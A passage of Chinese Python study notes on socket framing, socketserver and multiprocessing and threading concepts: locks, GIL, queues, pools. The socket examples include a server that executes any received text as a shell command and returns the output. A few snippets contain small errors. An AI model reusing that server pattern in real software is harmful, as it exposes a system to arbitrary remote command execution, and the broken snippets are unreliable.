                total_size = len(std_succ) + len(std_err)

                ## 先发头信息（固定长度的bytes)：对数据的描述信息
                header = struct.pack('i',total_size)  ## 把数字处理成长度固定的四个字节
                con.send(header)
                ## 发送正确内容
                con.send(std_succ)
                ## 发送错误内容
                con.send(std_err)
            except Exception:
                break
            
## 客户端
    from socket import *
    import struct

    client = socket(AF_INET,SOCK_STREAM)
    client.connect(('127.0.0.1',8080))

    while True:
        msg = input(">>>：").strip()
        if len(msg) == 0: continue
        client.send(msg.encode('utf-8'))
        header = client.recv(4)  ## 拿到数据总长度
        total_size = struct.unpack('i',header)[0] ## 解析数据总长度
        rec_size = 0
        while rec_size < total_size:
            res = client.recv(1024)  ## 本次接受最大接受1024个字节
            rec_size += len(res)
            print(res.decode('gbk'),end='	')
        else:
            print()
```

#### 10.9.4 解决粘包终极大招

```python
## 服务端
    from socket import *
    import subprocess
    import struct
    from hashlib import md5
    import json

    server = socket(AF_INET,SOCK_STREAM)
    server.bind(('127.0.0.1',8080))
    server.listen(5)

rn bs

    ## 第一件事：循环的从半连接池中取出链接请求，与其建立双向链接，拿到链接对象
    while True:
        con,client_addr = server.accept()

        ## 第二件事：拿到链接对象，与其进行通信循环
        while True:
            try:
                res = con.recv(1024)  ## 最大8096就可以
                if len(res) == 0: break
                obj = subprocess.Popen(
                    res.decode('utf-8'),
                    shell = True,
                    stdout = subprocess.PIPE,
                    stderr = subprocess.PIPE
                )
                std_succ = obj.stdout.read()  ## 拿到的结果都是是字节类型，但是window编码用的是gbk
                std_err = obj.stderr.read()
                total_size = len(std_succ) + len(std_err)

                ## 制作头
                header = {
                    'filename':'a.txt',
                    'total_size':total_size,
                    'md5':'ainiainiainiaini'
                }
                str_json = json.dumps(header)
                json_str_bytes = str_json.encode('utf-8')

                ## 先发头布长度信息
                header_size = struct.pack('i',len(json_str_bytes))
                con.send(header_size)
                
                ## 发送头部
                con.send(json_str_bytes)
                
                ## 发送正确内容
                con.send(std_succ)
                
                ## 发送错误内容
                con.send(std_err)
            except Exception:
                break

                
# 客户端
    from socket import *
    import struct
    import json

    client = socket(AF_INET,SOCK_STREAM)
    client.connect(('127.0.0.1',8080))

    while True:
        msg = input(">>>：").strip()
        if len(msg) == 0: continue
        client.send(msg.encode('utf-8'))
        
        ## 收四个字节的头部长度
        header_size_bytes = client.recv(4)  ## 拿到数据总长度
        header_size = struct.unpack('i',header_size_bytes)[0] ## 解析头部总长度
        
        ## 根据头部长度，读取头部信息
        header = client.recv(header_size).decode('utf-8')
        header_dic = json.loads(header)
        print(header_dic)

        ## 拿到数据大小
        total_size = header_dic.get('total_size')
        rec_size = 0

        while rec_size < total_size:
            res = client.recv(1024)  ## 本次接受最大接受1024个字节
            rec_size += len(res)
            print(res.decode('gbk'),end='	')
        else:
            print()
```

### 10.10 socketserver模块实现并发

#### 10.10.1 基于TCP协议并发

```python
## 服务端
    import socketserver

    class MyRequestHandele(socketserver.BaseRequestHandler):
        def handle(self):
            while True:
                try:
                    res = self.request.recv(1024)  ## 最大8096 就可以
                    if len(res) == 0: break
                    self.request.send(res.upper())

                except Exception:
                    break
                self.request.close()

    s = socketserver.ThreadingTCPServer(('127.0.0.1',8888),MyRequestHandele)
    s.serve_forever()
    
## 客户端
from socket import *

client = socket(AF_INET, SOCK_STREAM)
client.connect(('127.0.0.1', 8888))

while True:
	msg = input(">>>：").strip()
	if len(msg) == 0: continue
	client.send(msg.encode('utf-8'))
	res = client.recv(1024)  ## 本次接受最大接受1024个字节
	print(res.decode('utf-8'))
```

#### 10.10.2 基于UDP协议并发

```python
## 服务端

    import socketserver


    class MyRequestHandle(socketserver.BaseRequestHandler):
        def handle(self):
            client_data = self.request[0]
            server = self.request[1]  # 套接字对象
            client_addr = self.client_address
            print(client_data)
            server.sendto(client_data.upper(),client_addr)

    s = socketserver.ThreadingUDPServer(('127.0.0.1',8080),MyRequestHandle)
    s.serve_forever()	
    
## 客户端
    import socket

    ## socket.SOCK_STREAM(流式协议) === TCP协议  socket.SOCK_DGRAM ===== UDP协议
    client = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

    while True:
        user_input = input(">>>>>:").strip()
        client.sendto(user_input.encode('utf-8'),('127.0.0.1',8080))
        data,server_addr = client.recvfrom(1024)
        print(data.decode('utf-8'),server_addr)

    client.close()
```

# 七，并发编程

## 11.1 操作系统发展史

参考博客即可:<https://www.cnblogs.com/Dominic-Ji/articles/10929381.html>

### 11.1.1 多道技术

单核实现并发的效果

### 11.1.2 必备知识点

* 并发

  看起来像同时运行的就可以称之为并发

* 并行

  真正意义上的同时执行

ps:

* 并行肯定算并发
* 单核的计算机肯定不能实现并行，但是可以实现并发！！！

补充：我们直接假设单核就是一个核，干活的就一个人，不要考虑cpu里面的内核数



### 11.1.3 多道技术重点知识

空间上的服用与时间上的服用

* 空间上的复用

  多个程序公用一套计算机硬件

* 时间上的复用

  例子:洗衣服30s，做饭50s，烧水30s

  单道需要110s，多道只需要任务做长的那一个 		切换节省时间

  例子:边吃饭边玩游戏							   保存状态

切换+保存状态

```python
"""
切换(CPU)分为两种情况
	1.当一个程序遇到IO操作的时候，操作系统会剥夺该程序的CPU执行权限
		作用:提高了CPU的利用率 并且也不影响程序的执行效率
	
	2.当一个程序长时间占用CPU的时候，操作吸引也会剥夺该程序的CPU执行权限
		弊端:降低了程序的执行效率(原本时间+切换时间)
"""
```

## 11.2 进程理论

### 11.2.1 必备知识点

程序与进程的区别

```python
"""
程序就是一堆躺在硬盘上的代码，是“死”的
进程则表示程序正在执行的过程，是“活”的
"""
```

### 11.2.2 进程调度

* 先来先服务调度算法

  ```python
  """对长作业有利，对短作业无益"""
  ```

* 短作业优先调度算法

  ```python
  """对短作业有利，多长作业无益"""
  ```

* 时间片轮转法+多级反馈队列

  参考图解

### 11.2.3 进程运行的三状态图

参考图解了解即可

### 11.2.4 两对重要概念

* **同步和异步**

  ```python
  """描述的是任务的提交方式"""
  同步:任务提交之后，原地等待任务的返回结果，等待的过程中不做任何事(干等)
    	程序层面上表现出来的感觉就是卡住了
  
  异步:任务提交之后，不原地等待任务的返回结果，直接去做其他事情
    	我提交的任务结果如何获取？
      任务的返回结果会有一个异步回调机制自动处理
  ```

* **阻塞非阻塞**

  ```python
  """描述的程序的运行状态"""
  阻塞:阻塞态
  非阻塞:就绪态、运行态
  
  理想状态:我们应该让我们的写的代码永远处于就绪态和运行态之间切换
  ```

上述概念的组合:最高效的一种组合就是**异步非阻塞**

## 11.3 开启进程的两种方式

定心丸:代码开启进程和线程的方式，代码书写基本是一样的，你学会了如何开启进程就学会了如何开启线程

```PYTHON
from multiprocessing import Process
import time


def task(name):
    print('%s is running'%name)
    time.sleep(3)
    print('%s is over'%name)

## 在window系统中，创建进程一定在main下面下
## 因为window下创建进程类似于模块带入方式

if __name__ == '__main__':
    # 1 创建一个对象
    p = Process(target=task, args=('jason',))
    # 容器类型哪怕里面只有1个元素 建议要用逗号隔开
    # 2 开启进程
    p.start()  # 告诉操作系统帮你创建一个进程  异步
    print('主')
    
    
# 第二种方式 类的继承
from multiprocessing import Process
import time


class MyProcess(Process):
    def run(self):
        print('hello bf girl')
        time.sleep(1)
        print('get out!')


if __name__ == '__main__':
    p = MyProcess()
    p.start()
    print('主')
```

**总结**

```python
"""
创建进程就是在内存中申请一块内存空间将需要运行的代码丢进去
一个进程对应在内存中就是一块独立的内存空间
多个进程对应在内存中就是多块独立的内存空间
进程与进程之间数据默认情况下是无法直接交互,如果想交互可以借助于第三方工具、模块
"""
```

## 11.4 join方法

join是让主进程等待子进程代码运行结束之后，再继续运行。不影响其他子进程的执行

```python
from multiprocessing import Process
import time


def task(name, n):
    print('%s is running'%name)
    time.sleep(n)
    print('%s is over'%name)


if __name__ == '__main__':
    # p1 = Process(target=task, args=('jason', 1))
    # p2 = Process(target=task, args=('egon', 2))
    # p3 = Process(target=task, args=('tank', 3))
    # start_time = time.time()
    # p1.start()
    # p2.start()
    # p3.start()  # 仅仅是告诉操作系统要创建进程
    # # time.sleep(50000000000000000000)
    # # p.join()  # 主进程等待子进程p运行结束之后再继续往后执行
    # p1.join()
    # p2.join()
    # p3.join()
    start_time = time.time()
    p_list = []
    for i in range(1, 4):
        p = Process(target=task, args=('子进程%s'%i, i))
        p.start()
        p_list.append(p)
    for p in p_list:
        p.join()
    print('主', time.time() - start_time)
```

## 11.5 进程之间数据相互隔离

```python
from multiprocessing import Process

money = 100


def task():
    global money  # 局部修改全局
    money = 666  ## 其实也修改了money的值，但是改的只是自己进程里的，外面的没改
    print('子',money)  ## 666


if __name__ == '__main__':
    p = Process(target=task)
    p.start()
    p.join()
    print(money)  ## 100
```

## 11.6 人工智能相关网站

<http://www.turingapi.com/>

<https://www.xfyun.cn/?ch=bd05&b_scene_zt=1>

<http://ai.baidu.com/creation/main/demo>

作为一名python程序员当你遇到一个功能的时候，第一时间你可以考虑是否有对应的模块已经帮你实现了该功能

## 11.7  进程对象及其他方法

```python
"""
一台计算机上面运行着很多进程，那么计算机是如何区分并管理这些进程服务端的呢？
计算机会给每一个运行的进程分配一个PID号 
如何查看
	windows电脑 
		进入cmd输入tasklist即可查看
		tasklist |findstr PID查看具体的进程
	mac电脑 
		进入终端之后输入ps aux
		ps aux|grep PID查看具体的进程 
"""
from multiprocessing import Process, current_process
current_process().pid  # 查看当前进程的进程号

import os
os.getpid()  # 查看当前进程进程号
os.getppid()  # 查看当前进程的父进程进程号


p.terminate()  # 杀死当前进程
# 是告诉操作系统帮你去杀死当前进程 但是需要一定的时间 而代码的运行速度极快
time.sleep(0.1)
print(p.is_alive())  # 判断当前进程是否存活
```

## 11.8  僵尸进程与孤儿进程(了解)

```python
# 僵尸进程
"""
死了但是没有死透
当你开设了子进程之后 该进程死后不会立刻释放占用的进程号
因为我要让父进程能够查看到它开设的子进程的一些基本信息 占用的pid号 运行时间。。。
所有的进程都会步入僵尸进程
	父进程不死并且在无限制的创建子进程并且子进程也不结束
	回收子进程占用的pid号
		父进程等待子进程运行结束
		父进程调用join方法
"""

# 孤儿进程
"""
子进程存活，父进程意外死亡
操作系统会开设一个“儿童福利院”专门管理孤儿进程回收相关资源
"""
```

## 11. 9 守护进程

```PYTHON
from multiprocessing import Process
import time


def task(name):
    print('%s总管正在活着'% name)
    time.sleep(3)
    print('%s总管正在死亡' % name)


if __name__ == '__main__':
    p = Process(target=task,args=('egon',))
    # p = Process(target=task,kwargs={'name':'egon'})
    p.daemon = True  # 将进程p设置成守护进程  这一句一定要放在start方法上面才有效否则会直接报错
    p.start()
    print('皇帝jason寿终正寝')
```

## 11.10 互斥锁

多个进程操作同一份数据的时候，会出现数据错乱的问题

针对上述问题，解决方式就是加锁处理:**将并发变成串行，牺牲效率但是保证了数据的安全**

```python
from multiprocessing import Process, Lock
import json
import time
import random


# 查票
def search(i):
    # 文件操作读取票数
    with open('data','r',encoding='utf8') as f:
        dic = json.load(f)
    print('用户%s查询余票：%s'%(i, dic.get('ticket_num')))
    # 字典取值不要用[]的形式 推荐使用get  你写的代码打死都不能报错！！！


# 买票  1.先查 2.再买
def buy(i):
    # 先查票
    with open('data','r',encoding='utf8') as f:
        dic = json.load(f)
    # 模拟网络延迟
    time.sleep(random.randint(1,3))
    # 判断当前是否有票
    if dic.get('ticket_num') > 0:
        # 修改数据库 买票
        dic['ticket_num'] -= 1
        # 写入数据库
        with open('data','w',encoding='utf8') as f:
            json.dump(dic,f)
        print('用户%s买票成功'%i)
    else:
        print('用户%s买票失败'%i)


# 整合上面两个函数
def run(i, mutex):
    search(i)
    # 给买票环节加锁处理
    # 抢锁
    mutex.acquire()

    buy(i)
    # 释放锁
    mutex.release()


if __name__ == '__main__':
    # 在主进程中生成一把锁 让所有的子进程抢 谁先抢到谁先买票
    mutex = Lock()
    for i in range(1,11):
        p = Process(target=run, args=(i, mutex))
        p.start()
"""
扩展 行锁 表锁

注意：
	1.锁不要轻易的使用，容易造成死锁现象(我们写代码一般不会用到，都是内部封装好的)
	2.锁只在处理数据的部分加来保证数据安全(只在争抢数据的环节加锁处理即可) 
"""
```

## 11.11进程间通信

### 11.11.1队列Queue模块

```python
"""
管道:subprocess 
	stdin stdout stderr
队列:管道+锁

队列:先进先出
堆栈:先进后出
"""
from multiprocessing import Queue

# 创建一个队列
q = Queue(5)  # 括号内可以传数字 标示生成的队列最大可以同时存放的数据量

# 往队列中存数据
q.put(111)
q.put(222)
q.put(333)
# print(q.full())  # 判断当前队列是否满了
# print(q.empty())  # 判断当前队列是否空了
q.put(444)
q.put(555)
# print(q.full())  # 判断当前队列是否满了

# q.put(666)  # 当队列数据放满了之后 如果还有数据要放程序会阻塞 直到有位置让出来 不会报错

"""
存取数据 存是为了更好的取
千方百计的存、简单快捷的取

同在一个屋檐下
差距为何那么大
"""

# 去队列中取数据
v1 = q.get()
v2 = q.get()
v3 = q.get()
v4 = q.get()
v5 = q.get()
# print(q.empty())
# V6 = q.get_nowait()  # 没有数据直接报错queue.Empty
# v6 = q.get(timeout=3)  # 没有数据之后原地等待三秒之后再报错  queue.Empty
try:
    v6 = q.get(timeout=3)
    print(v6)
except Exception as e: 
    print('一滴都没有了!')

# # v6 = q.get()  # 队列中如果已经没有数据的话 get方法会原地阻塞
# print(v1, v2, v3, v4, v5, v6)

"""
q.full()
q.empty()
q.get_nowait()
在多进程的情况下是不精确
"""
```

### 11.11.2 IPC机制

```python
from multiprocessing import Queue, Process

"""
研究思路
    1.主进程跟子进程借助于队列通信
    2.子进程跟子进程借助于队列通信
"""
def producer(q):
    q.put('我是23号技师 很高兴为您服务')


def consumer(q):
    print(q.get())   ## '我是23号技师 很高兴为您服务'


if __name__ == '__main__':
    q = Queue()
    p = Process(target=producer,args=(q,))
    p1 = Process(target=consumer,args=(q,))
    p.start()
    p1.start()
```

### 11.11.3 生产者消费者模型

```python
"""
生产者:生产/制造东西的
消费者:消费/处理东西的
该模型除了上述两个之外还需要一个媒介
	生活中的例子做包子的将包子做好后放在蒸笼(媒介)里面，买包子的取蒸笼里面拿
	厨师做菜做完之后用盘子装着给你消费者端过去
	生产者和消费者之间不是直接做交互的，而是借助于媒介做交互
	
生产者(做包子的) + 消息队列(蒸笼) + 消费者(吃包子的)
"""


from multiprocessing import Process, Queue, JoinableQueue
import time
import random


def producer(name,food,q):
    for i in range(5):
        data = '%s生产了%s%s'%(name,food,i)
        # 模拟延迟
        time.sleep(random.randint(1,3))
        print(data)
        # 将数据放入 队列中
        q.put(data)


def consumer(name,q):
    # 消费者胃口很大 光盘行动
    while True:
        food = q.get()  # 没有数据就会卡住
        # 判断当前是否有结束的标识
        # if food is None:break
        time.sleep(random.randint(1,3))
        print('%s吃了%s'%(name,food))
        q.task_done()  # 告诉队列你已经从里面取出了一个数据并且处理完毕了


if __name__ == '__main__':
    # q = Queue()
    q = JoinableQueue()
    p1 = Process(target=producer,args=('大厨egon','包子',q))
    p2 = Process(target=producer,args=('马叉虫tank','泔水',q))
    c1 = Process(target=consumer,args=('春哥',q))
    c2 = Process(target=consumer,args=('新哥',q))
    p1.start()
    p2.start()
    # 将消费者设置成守护进程
    c1.daemon = True
    c2.daemon = True
    c1.start()
    c2.start()
    p1.join()
    p2.join()
    # 等待生产者生产完毕之后 往队列中添加特定的结束符号
    # q.put(None)  # 肯定在所有生产者生产的数据的末尾
    # q.put(None)  # 肯定在所有生产者生产的数据的末尾
    q.join()  # 等待队列中所有的数据被取完再执行往下执行代码
    """
    JoinableQueue 每当你往该队列中存入数据的时候 内部会有一个计数器+1
    没当你调用task_done的时候 计数器-1
    q.join() 当计数器为0的时候 才往后运行
    """
    # 只要q.join执行完毕 说明消费者已经处理完数据了  消费者就没有存在的必要了
```

## 11.12 线程

### 11.12.1 什么是线程

```python
"""
进程:资源单位
线程:执行单位

将操作系统比喻成一个大的工厂
那么进程就相当于工厂里面的车间
而线程就是车间里面的流水线

每一个进程肯定自带一个线程

再次总结:
	进程:资源单位(起一个进程仅仅只是在内存空间中开辟一块独立的空间)
	线程:执行单位(真正被cpu执行的其实是进程里面的线程，线程指的就是代码的执行过程，执行代码中所需要使用到的资源都找所在的进程索要)
	
进程和线程都是虚拟单位，只是为了我们更加方便的描述问题
"""
```

### 11.12.2 为何要有线程

```python
"""
开设进程
	1.申请内存空间	耗资源
	2.“拷贝代码”   耗资源
开线程
	一个进程内可以开设多个线程，在用一个进程内开设多个线程无需再次申请内存空间操作

总结:
	开设线程的开销要远远的小于进程的开销
	同一个进程下的多个线程数据是共享的!!!
"""
我们要开发一款文本编辑器
	获取用户输入的功能
  实时展示到屏幕的功能
  自动保存到硬盘的功能
针对上面这三个功能，开设进程还是线程合适？？？
	开三个线程处理上面的三个功能更加的合理
```

### 11.12.3 开启线程的两种方式

```python
## 第一种方法
    from multiprocessing import Process
    from threading import Thread
    import time

    def task(name):
        print('%s is running'%name)
       time.sleep(1)
        print('%s is over'%name)


    # # 开启线程不需要在main下面执行代码 直接书写就可以
    # # 但是我们还是习惯性的将启动命令写在main下面
    t = Thread(target=task,args=('egon',))
    p = Process(target=task,args=('jason',))
    p.start()
    t.start()  # 创建线程的开销非常小 几乎是代码一执行线程就已经创建了
    print('主')


 ## 第二种方法   
    from threading import Thread
    import time


    class MyThead(Thread):
        def __init__(self, name):
            """针对刷个下划线开头双下滑线结尾(__init__)的方法 统一读成 双下init"""
            # 重写了别人的方法 又不知道别人的方法里有啥 你就调用父类的方法
            super().__init__()
            self.name = name

        def run(self):
            print('%s is running'%self.name)
            time.sleep(1)
            print('egon DSB')


    if __name__ == '__main__':
        t = MyThead('egon')
        t.start()
        print('主')
```

### 11.12.4 TCP协议实现并发

```python
import socket
from threading import Thread
from multiprocessing import Process
"""
服务端
    1.要有固定的IP和PORT
    2.24小时不间断提供服务
    3.能够支持并发
    
从现在开始要养成一个看源码的习惯
我们前期要立志称为拷贝忍者 卡卡西 不需要有任何的创新
等你拷贝到一定程度了 就可以开发自己的思想了
"""
server =socket.socket()  # 括号内不加参数默认就是TCP协议
server.bind(('127.0.0.1',8080))
server.listen(5)


# 将服务的代码单独封装成一个函数
def talk(conn):
    # 通信循环
    while True:
        try:
            data = conn.recv(1024)
            # 针对mac linux 客户端断开链接后
            if len(data) == 0: break
            print(data.decode('utf-8'))
            conn.send(data.upper())
        except ConnectionResetError as e:
            print(e)
            break
    conn.close()

# 链接循环
while True:
    conn, addr = server.accept()  # 接客
    # 叫其他人来服务客户
    # t = Thread(target=talk,args=(conn,))
    t = Process(target=talk,args=(conn,))
    t.start()


"""客户端"""
import socket


client = socket.socket()
client.connect(('127.0.0.1',8080))

while True:
    client.send(b'hello world')
    data = client.recv(1024)
    print(data.decode('utf-8'))
```

### 11.12.5 线程对象的join方法

```python
from threading import Thread
import time


def task(name):
    print('%s is running'%name)
    time.sleep(3)
    print('%s is over'%name)


if __name__ == '__main__':
    t = Thread(target=task,args=('egon',))
    t.start()
    t.join()  # 主线程等待子线程运行结束再执行
    print('主')
```

### 11.12.6，同一个进程下的多个线程数据是共享的

```python
from threading import Thread
import time

money = 100

def task():
    global money
    money = 666
    print(money)  ### 666

if __name__ == '__main__':
    t = Thread(target=task)
    t.start()
    t.join()
    print(money) ## 666
```

### 11.12.7  线程对象属性及其他方法

```python
from threading import Thread, active_count, current_thread
import os,time


def task(n):
    # print('hello world',os.getpid())
    print('hello world',current_thread().name)
    time.sleep(n)


if __name__ == '__main__':
    t = Thread(target=task,args=(1,))
    t1 = Thread(target=task,args=(2,))
    t.start()
    t1.start()
    t.join()
    print('主',active_count())  # 统计当前正在活跃的线程数
    # print('主',os.getpid())
    # print('主',current_thread().name)  # 获取线程名字
```

### 11.12.8 守护线程

```python
from threading import Thread
import time

def task(name):
    print('%s is running'%name)
    time.sleep(1)
    print('%s is over'%name)  ## 这句话不会执行，主线程结束了以后，子线程也就结束了


if __name__ == '__main__':
    t = Thread(target=task,args=('egon',))
    t.daemon = True
    t.start()
    print('主')

"""
主线程运行结束之后不会立刻结束 会等待所有其他非守护线程结束才会结束
    因为主线程的结束意味着所在的进程的结束
"""
# 稍微有一点迷惑性的例子
from threading import Thread
import time

def foo():
    print(123)
    time.sleep(1)
    print('end123')

def func():
    print(456)
    time.sleep(3)
    print('end456')

if __name__ == '__main__':
    t1 = Thread(target=foo)
    t2 = Thread(target=func)
    t1.daemon = True ## ts设置成主线程死了以后立马死掉，但是由于主线程运行完了以后还要等待t2,所以不会立马死掉
    t1.start()
    t2.start()
    print('主.......')
    
    '''
    123
    456
    主 ## 还要等待t2运行完，才会死掉
    end123
    end456
    '''
```

### 11.12.9 线程互斥锁

```python
from threading import Thread,Lock
import time

money = 100
mutex = Lock()

def task():
    global money
    mutex.acquire()
    tmp = money
    time.sleep(0.1)
    money = tmp - 1
    mutex.release()


if __name__ == '__main__':
    t_list = []
    for i in range(100):
        t = Thread(target=task)
        t.start()
        t_list.append(t)
    for t in t_list:
        t.join()
    print(money)
```

### 11.12.10 GIL全局解释器锁

```python
"""
In CPython, the global interpreter lock, or GIL, is a mutex that prevents multiple 
native threads from executing Python bytecodes at once. This lock is necessary mainly 
because CPython’s memory management is not thread-safe. (However, since the GIL 
exists, other features have grown to depend on the guarantees that it enforces.)
"""
"""
python解释器其实有多个版本
	Cpython
	Jpython
	Pypypython
但是普遍使用的都是CPython解释器

在CPython解释器中GIL是一把互斥锁，用来阻止同一个进程下的多个线程的同时执行
	同一个进程下的多个线程无法利用多核优势！！！
	疑问:python的多线程是不是一点用都没有？？？无法利用多核优势
	
因为cpython中的内存管理不是线程安全的
内存管理(垃圾回收机制)
	1.应用计数
	2.标记清楚
	3.分代回收
	
"""

"""
重点:
	1.GIL不是python的特点而是CPython解释器的特点
	2.GIL是保证解释器级别的数据的安全
	3.GIL会导致同一个进程下的多个线程的无法同时执行即无法利用多核优势(******)
	4.针对不同的数据还是需要加不同的锁处理 
	5.解释型语言的通病:同一个进程下多个线程无法利用多核优势
"""
```

### 11.12.11 GIL与普通互斥锁的区别

```python
from threading import Thread,Lock
import time

mutex = Lock()
money = 100

def task():
    global money
    # with mutex:
    #     tmp = money
    #     time.sleep(0.1)
    #     money = tmp -1
    mutex.acquire()
    tmp = money
    time.sleep(0.1)  # 只要你进入IO了 GIL会自动释放
    money = tmp - 1
    mutex.release()

if __name__ == '__main__':
    t_list = []
    for i in range(100):
        t = Thread(target=task)
        t.start()
        t_list.append(t)
    for t in t_list:
        t.join()
    print(money)

"""
100个线程起起来之后  要先去抢GIL
我进入io GIL自动释放 但是我手上还有一个自己的互斥锁
其他线程虽然抢到了GIL但是抢不到互斥锁 
最终GIL还是回到你的手上 你去操作数据
"""
```

### 11.12.12 同一个进程下的多线程无法利用多核优势,是不是就没有用了

```python
"""
多线程是否有用要看具体情况
单核:四个任务(IO密集型\计算密集型)
多核:四个任务(IO密集型\计算密集型)
"""
# 计算密集型   每个任务都需要10s
    ## 单核(不用考虑了)
        ## 多进程:额外的消耗资源
      	## 多线程:介绍开销
    ## 多核
        ## 多进程:总耗时 10+
      	## 多线程:总耗时 40+

# IO密集型  
    ## 多核
      ## 多进程:相对浪费资源
      ## 多线程:更加节省资源
```

#### 12-1 代码验证

```python
## 计算密集型
    from multiprocessing import Process
    from threading import Thread
    import os,time


    def work():
        res = 0
        for i in range(10000000):
            res *= i

    if __name__ == '__main__':
        l = []
        print(os.cpu_count())  # 获取当前计算机CPU个数
        start_time = time.time()
        for i in range(12):
            p = Process(target=work)  # 1.4679949283599854
            t = Thread(target=work)  # 5.698534250259399
            t.start()
            # p.start()
            # l.append(p)
            l.append(t)
        for p in l:
            p.join()
        print(time.time()-start_time)


# IO密集型
    from multiprocessing import Process
    from threading import Thread
    import os,time


    def work():
        time.sleep(2)

    if __name__ == '__main__':
        l = []
        print(os.cpu_count())  # 获取当前计算机CPU个数
        start_time = time.time()
        for i in range(4000):
            # p = Process(target=work)  # 21.149890184402466
            t = Thread(target=work)  # 3.007986068725586
            t.start()
            # p.start()
            # l.append(p)
            l.append(t)
        for p in l:
            p.join()
        print(time.time()-start_time)
```

### 11.12.13 总结

```python
"""
多进程和多线程都有各自的优势
并且我们后面在写项目的时候通常可以
	多进程下面再开设多线程
这样的话既可以利用多核也可以介绍资源消耗
"""
```

## 11.13 死锁与递归锁（了解）

### 11.13.1 死锁

```python
## 当你知道锁的使用抢锁必须要释放锁，其实你在操作锁的时候也极其容易产生死锁现象(整个程序卡死 阻塞)

from threading import Thread, Lock
import time

mutexA = Lock() ## 类不一样。产生的是不同的对象
mutexB = Lock()

# 类只要加括号多次 产生的肯定是不同的对象
# 如果你想要实现多次加括号等到的是相同的对象 单例模式

## 类实例化多次得到的都是同一个对象 ------------------- 单例模式

class MyThead(Thread):
    def run(self):
        self.func1()
        self.func2()

    def func1(self):
        mutexA.acquire()
        print('%s 抢到A锁'% self.name)  # 获取当前线程名
        mutexB.acquire()
        print('%s 抢到B锁'% self.name)
        mutexB.release()
        mutexA.release()
        
    def func2(self):
        mutexB.acquire()
        print('%s 抢到B锁'% self.name)
        time.sleep(2)
        mutexA.acquire()
        print('%s 抢到A锁'% self.name)  # 获取当前线程名
        mutexA.release()
        mutexB.release()


if __name__ == '__main__':
    for i in range(10):
        t = MyThead()
        t.start()
```

### 11.13.2 递归锁

```python
from threading import Thread, Lock,Rlock()
"""
递归锁的特点	
	可以被连续的acquire和release
	但是只能被第一个抢到这把锁执行上述操作
	它的内部有一个计数器 每acquire一次计数加一 每realse一次计数减一
	只要计数不为0 那么其他人都无法抢到该锁
"""
# 将上述的
mutexA = Lock()
mutexB = Lock()
# 换成
mutexA = mutexB = RLock()

## 只要有人抢锁count加一，释放锁count减一，
## 如11.13.1 所示
 def func1(self):
        mutexA.acquire()  ## AA抢到了  A锁  count = 1
        print('%s 抢到A锁'% self.name)  # 获取当前线程名
        mutexB.acquire()   ## AA抢到了  B锁  count = 2
        print('%s 抢到B锁'% self.name)
        mutexB.release()  ## AA释放了  B锁  count = 1
        mutexA.release() ## AA释放了  A锁  count = 0    count = 0 时其他人才可以抢，所以不会出现死锁
        
    def func2(self):
        mutexB.acquire()
        print('%s 抢到B锁'% self.name)
        time.sleep(2)
        mutexA.acquire()
        print('%s 抢到A锁'% self.name)  # 获取当前线程名
        mutexA.release()
        mutexB.release()

```

## 11.14 信号量（了解）

信号量在不同的阶段可能对应不同的技术点

在并发编程中信号量指的是锁!!!

```python
"""
如果我们将互斥锁比喻成一个厕所的话
那么信号量就相当于多个厕所
"""
from threading import Thread, Semaphore
import time
import random


"""
利用random模块实现打印随机验证码(搜狗的一道笔试题)
"""
sm = Semaphore(5)  # 括号内写数字 写几就表示开设几个坑位


def task(name):
    sm.acquire()
    print('%s 正在蹲坑'% name)
    time.sleep(random.randint(1, 5))
    sm.release()


if __name__ == '__main__':
    for i in range(20):
        t = Thread(target=task, args=('伞兵%s号'%i, ))
        t.start()
```

## 11.15 Event事件（了解）

一些进程/线程需要等待另外一些进程/线程运行完毕之后才能运行，类似于发射信号一样

```Python
from threading import Thread, Event
import time


event = Event()  # 造了一个红绿灯


def light():
    print('红灯亮着的')
    time.sleep(3)
    print('绿灯亮了')
    # 告诉等待红灯的人可以走了
    event.set()


def car(name):
    print('%s 车正在灯红灯'%name)
    event.wait()  # 等待别人给你发信号
    print('%s 车加油门飙车走了'%name)


if __name__ == '__main__':
    t = Thread(target=light)
    t.start()

    for i in range(20):
        t = Thread(target=car, args=('%s'%i, ))
        t.start()
```

## 11.16  线程Q（了解）

```Python
"""
同一个进程下多个线程数据是共享的
为什么先同一个进程下还会去使用队列呢
因为队列是
    管道 + 锁
所以用队列还是为了保证数据的安全
"""
import queue

# 我们现在使用的队列都是只能在本地测试使用

# 1 队列q  先进先出
# q = queue.Queue(3)
# q.put(1)
# q.get()
# q.get_nowait()
# q.get(timeout=3)
# q.full()
# q.empty()


# 后进先出q
# q = queue.LifoQueue(3)  # last in first out
# q.put(1)
# q.put(2)
# q.put(3)
# print(q.get())  # 3

# 优先级q   你可以给放入队列中的数据设置进出的优先级
q = queue.PriorityQueue(4)
q.put((10, '111'))
q.put((100, '222'))
q.put((0, '333'))
q.put((-5, '444'))
print(q.get())  # (-5, '444')
# put括号内放一个元祖  第一个放数字表示优先级
# 需要注意的是 数字越小优先级越高!!!
```

## 11.17 进程池和线程池（掌握）

先回顾之前TCP服务端实现并发的效果是怎么玩的

每来一个人就开设一个进程或者线程去处理

```python
"""
无论是开设进程也好还是开设线程也好 是不是都需要消耗资源
只不过开设线程的消耗比开设进程的稍微小一点而已

我们是不可能做到无限制的开设进程和线程的 因为计算机硬件的资源更不上！！！
硬件的开发速度远远赶不上软件呐

我们的宗旨应该是在保证计算机硬件能够正常工作的情况下最大限度的利用它
"""
# 池的概念
"""
什么是池?
	池是用来保证计算机硬件安全的情况下最大限度的利用计算机
	它降低了程序的运行效率但是保证了计算机硬件的安全 从而让你写的程序能够正常运行
"""
```

### 11.17.1 线程池--进程池的基本使用

```python
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import time
import os


# pool = ThreadPoolExecutor(5)  # 池子里面固定只有五个线程
# 括号内可以传数字 不传的话默认会开设当前计算机cpu个数五倍的线程
pool = ProcessPoolExecutor(5)
# 括号内可以传数字 不传的话默认会开设当前计算机cpu个数进程
"""
池子造出来之后 里面会固定存在五个线程
这个五个线程不会出现重复创建和销毁的过程

池子造出来之后 里面会固定的几个进程
这个几个进程不会出现重复创建和销毁的过程

池子的使用非常的简单
你只需要将需要做的任务往池子中提交即可 自动会有人来服务你
"""

def task(n):
    print(n,os.getpid())
    time.sleep(2)
    return n**n

## 回调函数
def call_back(n):
    print('call_back>>>:',n.result()) ## 这里可以拿到结果
"""
任务的提交方式
    同步:提交任务之后原地等待任务的返回结果 期间不做任何事
    
